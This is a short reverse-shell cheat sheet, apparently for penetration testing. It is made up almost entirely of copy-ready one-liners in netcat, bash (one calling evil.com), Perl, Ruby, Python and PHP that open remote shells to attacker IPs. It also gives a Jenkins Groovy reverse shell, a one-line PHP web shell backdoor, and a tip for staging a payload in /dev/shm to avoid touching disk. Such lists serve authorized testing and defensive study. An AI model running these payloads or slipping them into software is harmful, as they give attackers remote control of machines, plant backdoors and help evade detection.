## One-liner reverse shells...
Netcat:
On the listener:

` nc -l -p 8080 -vvv`

On the remote host...

```
nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.103 4444 >/tmp/f &
```

Bash:
```
bash -i >& /dev/tcp/10.0.0.103/4443 0>&1

exec 5<>/dev/tcp/evil.com/8080
cat <&5 | while read line; do $line 2>&5 >&5; done
```
Perl:
```
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
Ruby:

`ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

Python:

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.227",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

PHP:

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. It it doesn't work, try 4,5, or 6)
```
PHP backdoor :

`<?php passthru($_GET['cmd']); ?>`
XTERM:
```
Server:
xterm -display 10.0.0.1:1
Listener:
Xnest :1
xhost +targetip
```

GROOVY SCRIPT SHELL (JENKINS script console)
```
﻿String host="10.10.14.26";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

For getting a revershell in shared memory so as to not touch hard drive use Linux Shared Memory -

'wget IP:port/reverse.py -O /dev/shm/.rev.py'

Python reverse shell - https://github.com/infodox/python-pty-shells

Upload tcp_pty_backconnect.py to target (/dev/shm or /tmp or wherever) [CHANGE IP AND PORT]
Run listener on attacker machine - tcp_pty_shell_handler.py -b IP:port 



